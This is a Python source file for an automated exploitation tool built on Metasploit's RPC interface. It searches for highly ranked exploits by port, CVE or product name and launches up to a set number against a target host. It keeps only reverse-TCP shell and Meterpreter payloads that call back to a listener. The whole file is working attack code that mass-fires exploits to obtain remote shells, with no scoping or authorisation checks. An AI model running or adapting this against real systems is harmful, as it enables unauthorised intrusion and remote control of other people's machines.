import time
import pymetasploit3.msfrpc as msfrpc
import logging

class MsfExploitRunner:
    def __init__(self, client, lhost, lport, search_result_max = 10):
        self.msf_client = client
        self.msf_search_result_max = search_result_max
        self.all_attempted_msf_exploits = {}
        self.cached_msf_searches = {}
        self.payload_lhost = lhost
        self.payload_lport = lport

    def is_msf_exploit_untested(self, ip: str, rport:int, exploit_name:str):
        if ip not in self.all_attempted_msf_exploits:
            return True

        if str(rport) not in self.all_attempted_msf_exploits[ip]:
            return True

        if exploit_name not in self.all_attempted_msf_exploits[ip][str(rport)]:
            return True

        return False

    def run_msf_search(self, search_args: str):
        if search_args in self.cached_msf_searches:
            return self.cached_msf_searches[search_args]

        new_console: msfrpc.MsfConsole = self.msf_client.consoles.console()
        while new_console.is_busy():
            time.sleep(0.01)
        new_console.read()
        new_console.write(f"search {search_args}")
        while new_console.is_busy():
            time.sleep(0.01)

        search_results: str = new_console.read()['data']
        all_results = []

        for line in search_results.splitlines(keepends=False):
            line = line.strip()
            if len(line) > 0 and line[0].isdigit():
                while line.find('   ') >= 0:
                    line = line.replace('   ', '  ')
                result = line.split('  ')
                while "" in result:
                    result.remove("")

                all_results.append(result)

        new_console.destroy()

        self.cached_msf_searches[search_args] = all_results

        return all_results

    def run_msf_exploit(self, exploit_name: str, rhosts: str, rport: int):
        def execute_payload_async(payload_name: str, exploit):
            msf_payload = self.msf_client.modules.use('payload', payload_name)
            try:
                msf_payload['LHOST'] = self.payload_lhost
            except:
                pass
            try:
                msf_payload['LPORT'] = self.payload_lport
            except:
                pass
            # I am nervous about this. Since we have object local variables, this could collide with other threads.
            # I don't think this is necessary though, since multiple payloads can call back to the same listener.
            #self.payload_lport += 1
            try: exploit.execute(payload=msf_payload)
            except: pass

        if self.msf_client is None:
            return
        
        def log_msf_exploit_attempt(rhost: str, rport: int, exploit_name: str):
            logging.info(f"Attempted {exploit_name} on {rhost}:{rport}")

        exploit_name = exploit_name.strip()
        if exploit_name.find('exploits/') == 0:
            exploit_name = exploit_name.replace('exploits/', '', 1)

        if self.is_msf_exploit_untested(rhosts, rport, exploit_name):
            log_msf_exploit_attempt(rhosts, rport, exploit_name)
        else:
            print(f"Already attempted: {rhosts}:{rport} - {exploit_name}")
            return

        print(f"Attempting {exploit_name} on {rhosts}:{rport}")

        exploit = self.msf_client.modules.use('exploit', exploit_name)
        try:
            exploit['RHOSTS'] = rhosts
        except:
            pass

        try:
            exploit['RPORT'] = str(rport)
        except:
            pass

        for payload in exploit.targetpayloads():
            # Ignore all the payloads we don't want to try...
            if payload.upper().find('BIND') > 0:
                # print("Ignoring bind exploits....")
                continue

            if payload.upper().find('NAMED_PIPE') > 0:
                # print("Ignoring named pipe exploits....")
                continue

            if payload.upper().find('IPV6') > 0:
                # print("Ignoring ipv6 exploits....")
                continue

            if payload.upper().find('INTERACT') > 0 or (payload.upper().find('REVERSE_TCP') > 0 and payload.upper().find('REVERSE_TCP_') < 0):
                pass
            else:
                # print("Not an interactive nor reverse shell...")
                continue

            if payload.upper().find("INTERACT") > 0 or payload.upper().find("SHELL") > 0 or payload.upper().find("METERPRETER") > 0:
                pass
            else:
                # print("Not an interact, shell, nor meteterpreter session.")
                continue

            if payload.upper().find("POWERSHELL") > 0:
                # print("Ignoring powershell.")
                continue

            # print(f"Attempting {rhosts}:{rport} - {exploit_name}:{payload}")

            # new_thread = threading.Thread(target=execute_payload_async, args=[payload, exploit])
            # new_thread.start()
            execute_payload_async(payload, exploit)

    def run_msf_hail_mary_on_ip_port(self, rhost: str, rport: int):
        exploit_count = 0

        search_results = self.run_msf_search(f"port:{str(rport)} type:exploit rank:excellent -s date -r")

        for result in search_results:
            if exploit_count < self.msf_search_result_max:
                # print(result)
                if self.is_msf_exploit_untested(rhost, rport, result[1]):
                    self.run_msf_exploit(result[1], rhost, rport)
                    exploit_count += 1


    def run_msf_against_cve(self, cve: str, rhost: str, rports:list):
        exploit_count = 0
        search_results = self.run_msf_search(f"cve:{cve.replace('CVE-','')} type:exploit rank:excellent -s date -r")

        for result in search_results:
            for rport in rports:
                if exploit_count < self.msf_search_result_max:
                    if self.is_msf_exploit_untested(rhost, rport, result[1]):
                        self.run_msf_exploit(result[1], rhost, rport)
                        exploit_count += 1


    def run_msf_against_product(self, product: str, rhost: str, rport:int):
        exploit_count = 0
        search_results = self.run_msf_search(f"description:{product} type:exploit rank:excellent  -s date -r")

        for result in search_results:
            if exploit_count < self.msf_search_result_max:
                if self.is_msf_exploit_untested(rhost, rport, result[1]):
                    self.run_msf_exploit(result[1], rhost, rport)
                    exploit_count += 1